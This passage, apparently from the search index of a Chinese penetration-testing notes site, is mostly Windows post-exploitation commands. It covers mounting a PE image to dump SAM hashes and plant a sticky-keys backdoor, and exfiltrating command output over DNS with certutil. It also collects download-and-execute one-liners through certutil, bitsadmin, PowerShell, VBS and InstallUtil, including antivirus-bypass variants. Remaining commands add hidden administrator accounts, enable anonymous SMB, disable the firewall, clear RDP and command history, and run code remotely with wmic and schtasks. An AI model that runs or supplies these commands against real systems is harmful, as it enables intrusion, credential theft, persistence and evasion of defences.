\u6ce8\u610f\u865a\u62df\u673a\u7684\u7cfb\u7edf\uff0c\u786e\u5b9a\u662fUEFI\u542f\u52a8\u8fd8\u662fBIOS\u542f\u52a8\uff0c\u4e00\u822cwin8\u4ee5\u4e0a\u7684\u7cfb\u7edf\u90fd\u662fUEFI\u542f\u52a8\uff0c\u6ce8\u610f\u8c03\u6210ISO\u5bf9\u5e94\u7684\u542f\u52a8\u65b9\u5f0f\u3002 \u8fdb\u5165PE\u540e\u53ef\u4ee5\u968f\u5fc3\u6240\u6b32\u4e86\uff0cPE\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u76f4\u63a5\u4fee\u6539\u7528\u6237\u5bc6\u7801\u7684\u5de5\u5177\u3002 \u5982\u679c\u8981\u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801\uff0c\u9700\u8981\u628a\u5de5\u5177\u5f04\u4e0a\u53bb\uff0c\u4f46\u662f\u865a\u62df\u673a\u65e0\u6cd5\u8fdb\u884c\u6587\u4ef6\u4ea4\u4e92\uff0c\u6240\u4ee5\u53ea\u80fd\u5c06\u5de5\u5177\u62d6\u5230PE\u955c\u50cf\u91cc\u53bb\uff0c\u8ba9\u4ed6\u81ea\u5df1\u52a0\u8f7d\u3002 \u7531\u4e8e\u4e00\u5f00\u59cb\u7528\u7684PE\u7cfb\u7edf\u662f32\u4f4d\u7684\uff0c\u5de5\u5177\u5404\u79cd\u90fd\u7528\u4e0d\u4e86\uff0c\u540e\u9762\u53c8\u627e\u4e86\u4e00\u4e2a64\u4f4d\u7684PE\u7cfb\u7edf\uff0c\u7136\u540e\u7528\u4e4b\u524d\u7684\u5f15\u5bfc\u7a0b\u5e8f\u6210\u529f\u52a0\u8f7d64\u4f4dPE\u3002 \u627e\u5230PE\u7cfb\u7edf\u4e2d\u7684WIM\u6587\u4ef6\uff0c\u7528\u538b\u7f29\u5305\u6253\u5f00\uff0c\u8981\u4ec0\u4e48\u5de5\u5177\u76f4\u63a5\u5f80\u91cc\u62d6\u3002 \u968f\u540e\u7528UltraISO\u91cd\u65b0\u6253\u5305\u6210ISO \u8fdb\u5165PE\u7cfb\u7edf\u540e\u628a\u5de5\u5177\u62d6\u51fa\u6765\u76f4\u63a5\u7528\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd0\u884c\u5de5\u5177\u4f1a\u62a5\u7f3a\u5c11dll\uff0c\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u628acmd\u76ee\u5f55\u5207\u6362\u5230system32\u4e0b\uff0c\u6216\u8005\u5c06C\u76d8system32\u76ee\u5f55\u52a0\u5230PE\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\u4e0b\u3002 \u968f\u540e\u5bfc\u51faSAM\u548cSYSTEM\u76f4\u63a5\u63d0\u53d6hash \u6700\u597d\u76f4\u63a5\u4f7f\u7528system32\\config\u76ee\u5f55\u4e0b\u7684SAM\u548csystem\uff0c\u4fe1\u606f\u6bd4\u8f83\u5b8c\u5168\uff0c\u8fd9\u91cc\u6ca1\u6709\u63d0\u5230NTLM\uff0c\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u60c5\u51b5 \u8fd8\u53ef\u4ee5\u52a0\u4e2a\u540e\u95e8\uff0c\u4e3a\u6240\u6b32\u4e3a move c:\\windows\\system32\\Magnify.exe c:\\windows\\system32\\Magnify1.exe move C:\\windows\\system32\\Utilman.exe C:\\windows\\system32\\Utilman1.exe move C:\\windows\\system32\\osk.exe C:\\windows\\system32\\osk1.exe move C:\\windows\\system32\\sethc.exe C:\\windows\\system32\\sethc1.exe copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\Magnify.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\Utilman.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\osk.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb /storage/db/vmware-vmdir/data.mdb","title":"\u5728\u865a\u62df\u673a\u4e0a\u6302PE\u7cfb\u7edf"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/","text":"title: Windows\u6280\u5de7 date: 2021-01-14 12:01:51 \u4fe1\u606f\u641c\u96c6\u5f88\u91cd\u8981 \u5e38\u7528CMD\u547d\u4ee4 whoami # \u67e5\u770b\u5f53\u524d\u7528\u6237 net user # \u67e5\u770b\u6240\u6709\u7528\u6237 query user # \u67e5\u770b\u5f53\u524d\u5728\u7ebf\u7528\u6237 ipconfig /all # \u67e5\u770b\u5f53\u524d\u4e3b\u673a\u7684\u4e3b\u673a\u540d/IP/DNS\u7b49\u4fe1\u606f route print # \u67e5\u770b\u8def\u7531\u8868\u4fe1\u606f netstat -ano # \u67e5\u770b\u7aef\u53e3\u5f00\u653e\u60c5\u51b5 arp -a # \u67e5\u770barp\u89e3\u6790\u60c5\u51b5 tasklist /svc # \u67e5\u770b\u8fdb\u7a0b\u53ca\u5bf9\u5e94\u670d\u52a1\u540d net localgroup administrators # \u67e5\u770b\u7ba1\u7406\u5458\u7ec4\u6210\u5458 systeminfo # \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\u542b\u8865\u4e01\u4fe1\u606f net use # \u67e5\u770bipc\u8fde\u63a5\u60c5\u51b5 net view # \u67e5\u770b\u533f\u540d\u5171\u4eab\u60c5\u51b5 netsh firewall show state # \u67e5\u770b\u9632\u706b\u5899\u72b6\u6001 cmdkey /l # \u67e5\u770b\u5f53\u524d\u4fdd\u5b58\u7684\u767b\u9646\u51ed\u8bc1 Windows\u7684\u672c\u5730\u547d\u4ee4\u6267\u884c \u53ef\u7528\u6765\u66ff\u4ee3cmd forfiles /c c:\\windows\\system32\\calc.exe #\u65e0\u9650\u8fd0\u884c pcalua.exe -a c:\\windows\\system32\\calc.exe powershell SyncAppvPublishingServer.vbs \"n; Start-Process c:\\windows\\system32\\calc.exe\" cmd.exe /c \"ping 127.0.0.1/../../../../../../../windows/system32/calc.exe\" conhost C:\\Windows\\System32\\calc.exe explorer.exe C:\\Users\\keefe\\desktop\\1.exe \u73af\u5883\u4fe1\u606f\u641c\u96c6 - nbtscan.exe xx.xx.xx.xx/24 # \u67e5\u770bc\u6bb5\u673a\u5668 - csvde.exe -f 1.csv -k # \u6279\u91cf\u5bfc\u5165/\u5bfc\u51faAD\u7528\u6237 - setspn.exe -T xx.xx.xx.xx -Q */* # \u67e5\u770b\u5f53\u524d\u57df\u5185\u6240\u6709spn - netstat -ano WMIC \u83b7\u53d6\u6240\u6709\u547d\u540d\u7a7a\u95f4\u7684\u7c7b Get-WmiObject -Namespace root\\directory\\ldap -Class * -List \u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u53c2\u6570 Get-WmiObject -Namespace root\\directory\\ldap -Class * -List | select -ExpandProperty Properties |select name,Origin \u83b7\u53d6\u6307\u5b9a\u7c7b\u7684\u8be6\u7ec6\u53c2\u6570 Get-WmiObject -Namespace root\\directory\\ldap -List -classname \"ds_dnszone\"| select -ExpandProperty Properties |select name,Origin \u83b7\u53d6\u6307\u5b9a\u7c7b\u7684\u6240\u6709\u6570\u636e Get-WmiObject -Namespace root\\directory\\ldap -Class ds_dnszone \u4f7f\u7528 /Namespace \u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c\u4f7f\u7528 /node \u3001 /user \u3001 /password \u6765\u8fdc\u7a0b\u8fd0\u884c\uff0c\u4f7f\u7528 path \u6765\u8c03\u7528win32\u7c7b\u3002 CIMWin32 WMI \u63d0\u4f9b\u7a0b\u5e8f - Win32 apps | Microsoft Docs \u67e5\u7a0b\u5e8f\u8def\u5f84 wmic process where name='xx.exe' get ExecutablePath wmic Process get name,ExecutablePath,ProcessId \u67e5\u6740\u6bd2 wmic /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u57df\u63a7 wmic /Namespace:\\\\root\\directory\\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u67e5\u57df\u5185\u6240\u6709\u673a\u5668 wmic /Namespace:\\\\root\\directory\\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u67e5\u8be2\u57df\u7684DN wmic /Namespace:\\\\root\\directory\\ldap path ds_domain get ds_distinguishedname,ds_dc \u67e5\u8be2\u8ba1\u7b97\u673a\u7528\u6237 wmic UserAccount wmic useraccount get name,sid \u67e5\u8be2BIOS-\u7528\u6765\u5224\u65ad\u865a\u62df\u673a wmic BIOS \u4f7f\u7528path\u8c03\u7528win32\u7c7b wmic path Win32_bios \u67e5\u770b\u5f53\u524d\u78c1\u76d8 wmic path Win32_LogicalDisk get Caption,VolumeName ping\u4e00\u4e2a\u5730\u5740\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53d1\u9001\u5305\u548c\u8fd4\u56de\u5305\u7684\u5927\u5c0f\u5224\u65ad\u662f\u5426\u6210\u529f wmic path Win32_PingStatus where Address=\"192.168.14.100\" get BufferSize,ReplySize,Timeout \u67e5\u770bIP\u5730\u5740\u76f8\u5173\u4fe1\u606f wmic path Win32_NetworkAdapterConfiguration get IPAddress,DefaultIPGateway,IPSubnet,DNSHostName,DNSDomain,MACAddress \u7ed3\u675f\u8fdb\u7a0b wmic process where processid=\"2345\" delete \u8fdc\u7a0b\u8fd0\u884c\u7a0b\u5e8f wmic /node:10.130.7.75 /user:exp1\\administrator /password:xxxx process call create c:\\360edr.exe \u7528list\u67e5\u770b\u662f\u5426\u8fd0\u884c\u6210\u529f wmic /node:10.130.7.75 /user:exp1\\administrator /password:xxxx process where name=\"chrome.exe\" get executablepath \u67e5\u770b\u78c1\u76d8 wmic logicaldisk get caption,description,drivetype,providername \u8fdc\u7a0b\u6267\u884c wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\\programdata\\test.bat wmic /node:10.130.7.75 /user:123\\administrator /password:123123 process call create c:\\360edr.exe wmic /node:192.168.17.138 process call create c:\\windows\\system32\\cmd.exe /c ipconfig > c:\\1.txt >wmic OS get Caption,CSDVersion,OSArchitecture,Version\u7cfb\u7edf\u7248\u672c >wmic service list brief \u5217\u51fa\u672c\u673a\u670d\u52a1 >wmic process list brief \u5217\u51fa\u8fdb\u7a0b >wmic process where name=\"chrome.exe\" get executablepath\u8fdb\u7a0b\u8def\u5f84 >wmic process get caption,commandline /value>>1.txt\u67e5\u8be2\u6240\u6709\u8fdb\u7a0b\u53c2\u6570 >wmic process where caption=\"svchost.exe\" get caption,commandline /value \u67e5\u8be2\u67d0\u4e2a\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 \u521b\u5efa\u8fdb\u7a0b >wmic process call create calc >wmic process call create \"C:\\shell.exe\" >wmic process call create \"shutdown.exe -r -f -t 20\" \u7ed3\u675f\u8fdb\u7a0b >wmic process where name=\"shell.exe\" call terminate >wmic process where processid=\"2345\" delete >wmic process 2345 call terminate >wmic startup list brief \u5217\u51fa\u81ea\u542f\u52a8\u7a0b\u5e8f >wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u770b\u6740\u6bd2\u8f6f\u4ef6 >wmic netuse list brief \u5217\u51fa\u5171\u4eab\u9a71\u52a8\u76d8 >wmic ntdomain list brief \u67e5\u8be2\u57df\u63a7\u5236\u5668 >wmic useraccount list brief \u5217\u51fa\u672c\u673a\u7ba1\u7406\u5458\u53caSID >wmic qfe list brief \u5217\u51fa\u8865\u4e01\u5217\u8868 >wmic share get name,path \u67e5\u770b\u5171\u4eab >wmic startup list brief\u67e5\u770b\u542f\u52a8\u9879 >wmic product get name,version \u67e5\u770b\u5b89\u88c5\u7684\u8f6f\u4ef6 >wmic product where \"name like '%360%'\" get name \u67e5\u770b\u7a0b\u5e8f\u540d >wmic product where name=\"360tray\" call uninstall \u5378\u8f7d\u7a0b\u5e8f >wmic process where \"name like '%360%'\" get name \u67e5\u627e\u8fdb\u7a0b\u5168\u540d >wmic product where name=\"360tray.exe\" call terminate \u505c\u6b62\u7a0b\u5e8f >wmic desktop get screensaversecure,screensavertimeout \u67e5\u770b\u5c4f\u4fdd \u67e5\u6740\u8f6f WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u7cfb\u7edf\u7248\u672c wmic OS wmic OS get Caption,CSName \u67e5\u7a0b\u5e8f wmic product get name,version \u5f53\u524d\u767b\u5f55\u7528\u6237 quser \u5b89\u88c5\u7684\u7a0b\u5e8f wmic product get name,version \u5f00\u8fdc\u7a0b\u8fde\u63a5\u7aef\u2f1d server 2003 & XP wmic path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f server2008/7/2012 wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call set allowtsconnections 1 wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 7\u548c2012\u53ea\u9700\u8981\u524d\u4e24\u6761\u5373\u53ef \u5bc6\u7801\u641c\u96c6 SauronEye sharpcollection \u5feb\u901f\u641c\u7d22\u67d0\u540e\u7f00\u6216\u5185\u5bb9\u7684\u6587\u4ef6,\u901f\u5ea6\u771f\u7684\u5f88\u5feb. -f \u6307\u5b9a\u540e\u7f00,-c\u6307\u5b9a\u5185\u5bb9 SauronEye.exe -f \".txt \".doc\" -c \"pass\" \u641c\u7d22\u540d\u5b57\u53ef\u4ee5\u4f7f\u7528 dir /s /b c:\\ | findstr \u5bc6\u7801 SharpDir sharpcollection \u53ef\u4ee5\u672c\u5730\u6216\u8fdc\u7a0b\u641c\u7d22 \u5173\u9632\u706b\u5899 netsh firewall set opmode disable \u662f\u5426\u5f00\u542f\u4e86UAC 0x0 \u65e0UAC 0x5 \u4e2d\u9632\u62a4 0x2 \u9ad8\u9632\u62a4 REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin \u547d\u4ee4DNS\u5916\u5e26 cmd /c \"whoami > abcde && set /p xx=<abcde && certutil -urlcache -split -f http://123.ceye.io?a=%xx% cmd /c /v \"whoami > abcde && set /p xx=<abcde && certutil -urlcache -split -f http://123.ceye.io?a=!xx! \u957f\u547d\u4ee4\u7f16\u7801\u540e\u5e26\u51fa cmd /v /c \"whoami > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR=< temp3 && set FINAL=!MYVAR!.xxx.ceye.io && ping -n 1 !FINAL!\" && del /F temp* \u547d\u4ee4\u7f16\u7801 ipconfig > D:\\temp && certutil -encode D:\\temp D:\\temp3 && findstr /L /V \"CERTIFICATE\" D:\\temp3 > D:\\temp4 && type D:\\temp4 && del D:\\temp* RDP\u76f8\u5173 \u5f00\u542fRDP\u670d\u52a1 \u5f00\u542f REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u67e5\u7aef\u53e3 REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDP-Tcp /v PortNumber \u5bfb\u627eRDP\u7684\u8fde\u63a5\u8bb0\u5f55 \u76f4\u63a5\u8fd0\u884c <# .SYNOPSIS This script will list all users' RDP Connections History. First use \"reg load\" to load hive. Then read the RDP Connections History from HKEY_USERS. Last you need to use \"reg unload\" to unload hive. The script automatically implements the above operation,there is no need for a GUI. :) Author: 3gstudent@3gstudent License: BSD 3-Clause #> $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { $RegPath = \"Registry::HKEY_USERS\\\"+$User.SID+\"\\Software\\Microsoft\\Terminal Server Client\\Servers\\\" Write-Host \"User:\"$User.Name Write-Host \"SID:\"$User.SID Write-Host \"Status:\"$User.Status $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue If(!$?) { Write-Host \"[!]Not logged in\" Write-Host \"[*]Try to load Hive\" $File = \"C:\\Documents and Settings\\\"+$User.Name+\"\\NTUSER.DAT\" $Path = \"HKEY_USERS\\\"+$User.SID Write-Host \"[+]Path:\"$Path Write-Host \"[+]File:\"$File Reg load $Path $File If(!$?) { Write-Host \"[!]Fail to load Hive\" Write-Host \"[!]No RDP Connections History\" } Else { $QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue If(!$?) { Write-Host \"[!]No RDP Connections History\" } Else { foreach($Name in $QueryPath) { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"Server:\"$Name Write-Host \"User:\"$User } } Write-Host \"[*]Try to unload Hive\" Start-Process powershell.exe -WindowStyle Hidden -ArgumentList \"Reg unload $Path\" } } foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"Server:\"$Name Write-Host \"User:\"$User } Catch { Write-Host \"[!]No RDP Connections History\" } } Write-Host \"----------------------------------\" } Kali\u4e0b\u8fdeRDP \u5217\u4e24\u4e2a\u6bd4\u8f83\u597d\u7528\u7684\uff0ckali\u81ea\u5e26\u7684 xfreerdp /v:192.168.0.20:3389 /u:administrator /p:Huawei12#$ /cert-ignore /drive:share1,/tmp rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1=/tmp \u6e05\u9664RDP\u8bb0\u5f55 @echo off @reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f @del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a @exit \u65b0\u5efa\u7528\u6237\u76f8\u5173 net user test PasS@d123@pas /add \u52a0\u5165\u7ba1\u7406\u5458\u7ec4 net localgroup administrators test /add \u52a0\u5165\u8fdc\u7a0b\u684c\u9762\u7528\u6237\u7ec4 net localgroup \"remote desktop users\" test /add net user guest /active:yes && net user guest Aa123456. && net localgroup Administrators guest /add && net localgroup \"Remote Desktop Users\" guest /add \u4e0b\u8f7d\u6587\u4ef6 Chromium\u5185\u6838\u6d4f\u89c8\u5668\u4e0b\u8f7d 1.\u4e0b\u8f7d\u7684\u6587\u4ef6\u9700\u8981\u7f16\u7801 2.\u4e0b\u8f7d\u7684\u6587\u4ef6\u9700\u8981\u662fhtml \u5c06\u6587\u4ef6\u7f16\u7801\u540e\u7684\u5185\u5bb9\u653e\u5230HTML\u4e2d\uff0c\u5fc5\u987b\u662f\u72ec\u7acb\u884c\uff0c\u5426\u5219\u540e\u7eed\u4f1a\u6709\u95ee\u9898 <html><head></head><body> YXNmcXdmcXdmYWZhc2Zhc2Rhc2Rhc2Rhc2Q= </body></html> \u4e0b\u8f7d \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --enable-logging --disable-gpu --dump-dom \"http://1.1.1.1:8991/1.html\" > a.1 findstr\u6392\u9664html\u6807\u7b7e findstr /v \"html>\" a.1 > a.2 certutil\u8fd8\u539f\u539f\u59cb\u5185\u5bb9 certutil -decode a.2 a.3 smb\uff08\u4ec5UNC\uff09 \u7528impacket\u5feb\u901f\u5f00\u542fsmb smbserver.py -smb2support share /tmp/1.exe windows\u547d\u4ee4\u4e0b\u8f7d\uff08\u9700\u8981\u505c\u7528\u7981\u6b62\u6765\u5bbe\u8bbf\u95ee\u7684\u7b56\u7565\uff09 Pcalua -a \\\\x.x.x.x\\share\\777.exe //\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7a0b\u5e8f\uff0c\u4f46\u6709UAC copy \\\\x.x.x.x\\share\\777.exe //\u4eceUNC\u590d\u5236\u7a0b\u5e8f \u9047\u6743\u9650\u95ee\u9898\u65f6\u53ef\u8bd5\u4e0b\u9762\u7684 REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f certutil http://127.0.0.1:8000/1.txt C:\\users\\public\\music\\a&echo [W]&cd&echo [Q] cmd /c certutil -urlcache -split -f http://x.x.x.x/%USERNAME%+%COMPUTERNAME%+%HOMEPATH% certutil -urlcache -split -f http://1.1.1.1:8080/ac.xml 1.xml certutil -urlcache -split -f http://1.1.1.1:7522/1.exe \"C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\\\1.exe\" \u4e0b\u8f7ddll\uff0c\u5229\u7528InstallUtil\u6267\u884c certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll \u4e0b\u8f7d\u5e76\u6267\u884c certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe certutil\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u5b58\u50a8\u4f4d\u7f6e\u662f %USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content \u67e5\u770b\u7f13\u5b58\u9879\u76ee\uff1a certutil.exe -urlcache * CertUtil -decode InFile OutFile bypass360\uff082021-7-19\uff09\uff1a certutil -urlcache -split -f crl delete certutil -urlcache -split -f http://1.1.1.1:8000 a \u4f7f\u7528\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7 \u4f7f\u7528unicode\u7f16\u7801\u7ed5\u8fc7 bitsadmin bitsadmin /transfer myDownLoadJob /download /priority normal http://http://47.100.123.59:7522/1.exe c:\\users\\1a.exe \u4f7f\u7528\u5f15\u53f7\u7ed5\u8fc7 bitsadmin /\"t\"ransfer cc http://1.1.1.1:8000 %temp%\\a.txt powershell powershell Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\" powershell \"Import-Module BitsTransfer;start-bitstransfer http://uee.me/crAJs cd.bat\"|cd.bat powershell (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1:8000','c:\\user\\public\\a');start-process 'c:\\download\\a.exe' powershell.exe iwr -uri 192.168.212.1:90/1 -o x \u4eceUNC\u8bfb\u53d6\u6267\u884c powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 ftp python\u5feb\u901f\u642d\u5efaftp python -m pyftpdlib -i 0.0.0.0 -p 21 -d . \u7279\u6b8a\u7aef\u53e3\u7684\u4e0b\u8f7d\u547d\u4ee4 (echo open 192.168.52.129 2121 & echo get get-pip.py savexxx)| ftp -A @ \u9ed8\u8ba4\u7aef\u53e3\u7684\u4e0b\u8f7d\u547d\u4ee4 echo get 1 save | ftp -A 192.168.212.1 # all works vbs \u5199\u5165vbs\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u552f\u4e00\u7684\u529f\u80fd\u5c31\u662f\u4e0b\u8f7d echo set a=createobject(^\"adod^\"+^\"b.stream^\"):set w=createobject(^\"micro^\"+^\"soft.xmlhttp^\"):w.open ^\"get^\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 > 1.vbs cscript\u6267\u884cvbs cscript 1.vbs http://192.168.52.129:8000/calc.exe calc.exe exe \u5199C#\u4ee3\u7406\uff0c\u76f4\u63a5\u7f16\u8bd1\u6210exe\uff0c\u8be5exe\u552f\u4e00\u7684\u529f\u80fd\u5c31\u662f\u4e0b\u8f7d echo using System.Net;class WebDL { static void Main(string[] args){System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);}} > 1.cs csc\u7f16\u8bd1 c:\\windows\\microsoft.net\\framework\\v4.0.30319\\csc.exe 1.cs out\u53c2\u6570\u6307\u5b9a\u8f93\u51fa\u76ee\u5f55 c:\\windows\\microsoft.net\\framework\\v3.5\\csc /out:c:\\1.exe 1.cs \u8fd0\u884c 1.exe http://192.168.52.129:8000/calc.exe calc.exe cmdl32 \u521b\u5efa\u4e00\u4e2asettings.txt\u914d\u7f6e\u6587\u4ef6 [Connection Manager] CMSFile=settings.txt Servicename=WindowsUpdate TunnelFile=settings.txt [Settings] UpdateUrl=http://x.x.x.x/x.exe \u6267\u884c cmdl32 /vpn /lan c:\\settings.txt \u4e0b\u8f7d\u5b8c\u91cd\u547d\u540d \u7f51\u7edc\u5185\u4e3b\u673a\u63a2\u6d4b \u6539\u8fdb\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u811a\u672c rem a\u6bb5\u63a2\u6d4b @echo off rem \u4fee\u6539ip\u7684\u503c\u4ee5\u6307\u5b9aa\u6bb5 setlocal enabledelayedexpansion set ip=10 for /l %%i in (0,1,255) do ( for /l %%k in (0,1,255) do ( for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find /i \"ttl=\" >> null if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! >> ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! ) ) ) ) exit rem b\u6bb5\u63a2\u6d4b @echo off setlocal enabledelayedexpansion set ip=192.168 for /l %%i in (0,1,255) do ( for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find /i \"ttl=\" >> null if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! >> bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! ) ) ) exit rem c\u6bb5\u63a2\u6d4b @echo off setlocal enabledelayedexpansion set ip=192.168.148 for /l %%k in (0,1,254) do ( @ping %ip%.%%k -w 1 -n 1| findstr \"TTL=\" >nul if !errorlevel! equ 0 (echo %ip%.%%k is alive ! >> cscan.txt ) else (echo %ip%.%%k May be not exist ! ) ) pause \u5386\u53f2\u547d\u4ee4 \u4e0d\u7ba1\u662fpowershell\u8fd8\u662fcmd\uff0c\u80fd\u591f\u8bfb\u53d6\u7684\u5386\u53f2\u547d\u4ee4\u4ec5\u9650\u4e8e\u5f53\u524d\u7a97\u53e3\uff0c\u5f53\u524d\u7a97\u53e3\u5173\u95ed\u540e\u4f1a\u81ea\u52a8\u6e05\u9664\uff0c\u65e0\u6cd5\u8bfb\u53d6 \u67e5\u770b cmd>doskey /h poershell>Get-History | Format-List -Property * \u6e05\u7a7a cmd>doskey /reinstall powershell>Clear-History \u4e00\u952e\u67e5\u8be2\u65e5\u5fd7\u767b\u5f55\u4e8b\u4ef6 \u901a\u8fc7\u4fee\u6539\u4e8b\u4ef6ID\u6765\u67e5\u8be2\u4e0d\u540c\u767b\u5f55\u4e8b\u4ef6 $Events = Get-WinEvent -LogName \"security\" -FilterXPath \"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]\" ForEach ($Event in $Events) { $eventXML = [xml]$Event.ToXml() For ($i=0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) { Add-Member -InputObject $Event -MemberType NoteProperty -Force -Name $eventXML.Event.EventData.Data[$i].name -Value $eventXML.Event.EventData.Data[$i].'#text' } } $events|select ipaddress \u4e00\u952e\u5f00\u542fsmb\u533f\u540d\u8bbf\u95ee mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous` logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f \u8ba1\u7b97\u673a\u4f11\u7720 \u67e5\u8be2\uff0c0\u4e3a\u5173\u95ed\uff0c1\u4e3a\u5f00\u542f reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\Power /v HibernateEnabled \u4fee\u6539 reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\Power /v HibernateEnabled /t reg_dword /d 0 \u5229\u7528workfolders\u6267\u884c\u7a0b\u5e8f workfolders\u547d\u4ee4\u4f1a\u6267\u884c\u5f53\u524d\u76ee\u5f55\u4e0b\u7684control.exe C:\\Users\\ede>copy c:\\windows\\system32\\calc.exe control.exe \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\ede>workfolders C:\\Users\\ede> AT\u8ba1\u5212\u4efb\u52a1 at \\\\192.168.1.1 10:00 calc.exe SCHTASKS /Create /S 1.1.1.1 /U doamin\\test /P \"123123..\" /SC ONCE /ST 11:00 /TN test1 /TR c:\\1.exe /RU system 